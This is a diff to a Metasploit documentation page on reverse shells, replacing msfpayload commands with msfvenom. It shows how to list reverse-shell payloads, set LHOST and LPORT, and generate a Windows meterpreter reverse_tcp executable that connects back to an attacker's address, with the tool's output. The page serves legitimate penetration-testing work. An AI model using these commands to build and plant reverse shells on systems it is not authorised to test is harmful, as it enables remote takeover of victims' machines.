@@ -22,10 +22,10 @@ This article goes over using a reverse shell to get a session.
 
 ## List of Metasploit reverse shells
  
-To get a list of reverse shells, use the `msfpayload` command. B
+To get a list of reverse shells, use the `msfvenom` command:
 
 ```bash
-./msfpayload -l |grep reverse
+msfvenom -l payloads | grep reverse
 ```
 
 As a rule of thumb, always pick a Meterpreter, because it currently provides better support of the post-exploitation Metasploit has to offer. For example, railgun, post modules, different meterpreter commands.
@@ -57,7 +57,7 @@ This also applied to VNC, remote desktop, SMB (psexec), or other remote admin to
 
 ## How to set up for a reverse shell during payload generation
 
-When you generate a reverse shell with either `msfpayload` or `msfvenom`, you must know how to configure the following:
+When you generate a reverse shell with `msfvenom`, you must know how to configure the following:
 
 * **LHOST** - This is the IP address you want your target machine to connect to. If you're in a local area network, it is unlikely your target machine can reach you unless you both are on the same network. In that case, you will have to [find out your public-facing IP address](https://www.google.com/webhp?q=ip#q=ip), and then configure your network to port-forward that connection to your box. LHOST should not be "localhost", or "0.0.0.0", or "127.0.0.1", because if you do, you're telling the target machine to connect to itself (or it may not work at all).
 * **LPORT** - This the port you want your target machine to connect to.
@@ -90,14 +90,16 @@ In this demonstration, we have two boxes:
 
 ### Step 1: Generate the executable payload
 
-On the attacker's box, run `msfpayload` or `msfvenom`: 
+On the attacker's box, run `msfvenom`: 
 
 ```bash
-$ ./msfpayload windows/meterpreter/reverse_tcp lhost=192.168.1.123 lport=4444 X > /tmp/iambad.exe
-Created by msfpayload (http://www.metasploit.com).
-Payload: windows/meterpreter/reverse_tcp
-Length: 287
-Options: {"LHOST"=>"192.168.1.123", "LPORT"=>"4444"}
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.123 LPORT=4444 -f exe -o /tmp/iambad.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 354 bytes
+Final size of exe file: 73802 bytes
+Saved as: /tmp/iambad.exe
 ```
 
 ### Step 2: Copy the executable payload to box B
